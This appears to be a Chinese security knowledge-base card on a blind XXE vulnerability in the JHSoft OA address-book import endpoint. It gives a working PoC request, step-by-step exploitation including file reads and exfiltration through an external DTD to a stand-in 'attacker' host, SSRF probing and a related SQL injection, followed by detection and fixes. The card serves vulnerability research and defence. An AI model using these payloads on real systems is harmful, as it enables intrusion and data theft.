---
id: web-generic-xxe-jhsoft-addressimportpub-loadxml-dnslog
title: JHSoft OA AddressImportPub.aspx 未加固 XmlDocument.LoadXml：DNSLog 外带验证 XXE
type: scenario
domain: web
path: web/generic/xxe
technique: dotnet-xmldocument-loadxml-xxe-oob-dnslog
tags:
- xxe
- dotnet
- aspx
- xmldocument
- loadxml
- oob
- dnslog
- oa
- jhsoft
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V215
  verified_at: '2026-11-07T05:04:26+08:00'
  notes: 已对照原文与 img/18/21 核对 Request.InputStream→XmlDocument.LoadXml 未设 XmlResolver/未禁 DTD，参数实体 %remote 指向 dnslog 后返回 200 且 DNSLog 命中 60.215.138.22。未验证点：未复跑；文件读取/内网探测未展示，卡内已注明。
url: /docs/web/generic/xxe/web-generic-xxe-jhsoft-addressimportpub-loadxml-dnslog/
draft: false
kb_aliases:
- JHSoft XXE
- 金和 OA XXE
- AddressImportPub.aspx XXE
- XmlDocument.LoadXml 外部实体
- DNSLog 盲 XXE
- 通讯录导入 XXE
---

## 一句话结论

JHSoft OA 通讯录导入接口 `Jhsoft.Web.addressbook/AddressImportPub.aspx` 把请求体整体交给 `XmlDocument.LoadXml`，既没有设置 `XmlResolver = null` 也没有禁用 DTD；用参数实体引用外部 DNSLog 域名时目标会发起解析请求，文章已用 DNSLog 命中验证 XXE，进一步可用 `file://` 实体读取服务器文件或用 `http://` 探测内网。

## 原理

- 代码 `GetXmlInfoAndSave()`：`StreamReader streamReader = new StreamReader(base.Request.InputStream); string xml = streamReader.ReadToEnd();`，随后 `XmlDocument xmlDocument = new XmlDocument(); xmlDocument.LoadXml(xml);`。请求体即 XML，未做结构校验、未拒绝 `DOCTYPE`。
- `XmlDocument.LoadXml` 是否解析外部实体取决于 `XmlDocument.XmlResolver` 与 DTD 处理策略。代码既未把 `XmlResolver` 置为 `null`，也未通过 `XmlReaderSettings` 设置 `DtdProcessing = Prohibit`，因此沿用运行时的默认值；在默认解析外部实体的 .NET Framework 部署或显式配置了解析器的环境上，`<!ENTITY ... SYSTEM "http://...">` 会被展开。
- 参数实体在 DTD 中通过 `%remote;` 引用时，解析器会向外部 DTD 地址发起请求；即使响应体不包含实体内容，攻击者也能从 DNSLog/HTTP 服务器看到目标出口 IP 与请求时间，从而确证 XXE 存在（盲 XXE）。
- 同一段代码还把 XML 根节点的子节点名与 `InnerText` 分别拼进 `insert into AddressUser (...)` 的字段列表和值列表（`text += 子节点名`、`text2 += "'" + InnerText + "'"`），解析后的内容随后直接进入 SQL 执行；这是与 XXE 并存的第二个风险面。
- 文章 PoC 的响应是 200，且 DNSLog 记录出现目标解析请求，说明解析阶段外部实体已被处理；读取文件内容需要有回显或二次外带通道。

## 触发条件

- 目标存在 `C6/Jhsoft.Web.addressbook/AddressImportPub.aspx` 且可向该地址 POST XML。
- 目标 .NET Framework/配置允许 `XmlDocument` 解析 DTD 与外部实体（旧版本默认允许，或代码/配置恢复了 `XmlUrlResolver`）。
- OOB 验证要求目标可出网（DNS 或 HTTP）；文件读取要求进程对目标文件有读权限。
- 有回显文件读取还需要页面把解析结果或异常回显。

## 利用步骤

1. 先用无害 XML 确认接口行为（是否返回 200/错误页、是否要求登录会话）。
2. 发送带外部参数实体的 XML，实体指向自建 DNSLog 域名；观察 DNSLog 是否出现目标 IP 的解析记录，确认 XXE。
3. 有回显时，把实体改为 `file:///c:/windows/win.ini` 或 `file:///etc/passwd`，在响应/报错中读取内容。
4. 无回显时，使用外部 DTD 把文件内容拼进外带 URL：主文档引用 `http://attacker/evil.dtd`，DTD 内先用 `%file` 读取文件，再拼出 `http://attacker/?d=%file;` 的实体。
5. 若目标出网受限，可改用 `http://127.0.0.1:port/` 或内网地址的实体做 SSRF 探测。

## PoC

```http
POST /c6/Jhsoft.Web.addressbook/AddressImportPub.aspx/ HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 132

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://<dnslog-domain>/">
%remote;
]>
<root/>
```

```text
# 文章结果：请求返回 200，DNSLog 出现该域名解析记录（来源为目标服务器出口 IP）
# 证明 XML 解析器处理了外部实体；文件读取需再构造 file:// 实体或外部 DTD 外带
```

## 变体与关联

- 变体：有回显时直接 `<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">` 并在节点中引用 `&xxe;`；无回显时用参数实体 + 外部 DTD 外带。
- 变体：同一接口的 XML 子节点名/值会拼接进 `INSERT` 语句，可同时测试 SQL 注入（见关联卡）。
- 关联：[[web-generic-xxe-dongsheng-logistics-custommainfast-loadxml]]（.NET `XmlDocument.LoadXml` 未加固的同类 XXE，含 .NET 版本默认值差异说明）；[[web-generic-sqli-jhsoft-addressimportpub-xml-node-concat]]（同一接口的 XML 节点拼接 SQL 注入）。
- 边界：文章只验证了 DNSLog OOB，未展示文件读取或内网探测；能否读文件取决于目标 .NET 版本、`XmlResolver` 配置与文件权限。原文未标注受影响版本。

## 检测与防御

- 检测：请求体出现 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`%remote;`、`file://`、`http://` 等特征；服务器向未知域名发起 DNS/HTTP 请求；`AddressImportPub.aspx` 收到非业务结构的 XML。
- 修复：解析前设置 `xmlDocument.XmlResolver = null;`；更稳妥地使用 `XmlReader.Create(stream, new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null })` 再 `Load`。
- 加固：拒绝包含 `DOCTYPE` 的请求体；对导入 XML 做 XSD/字段白名单校验；限制应用池出网与文件读权限；对异常 DNS 解析告警。
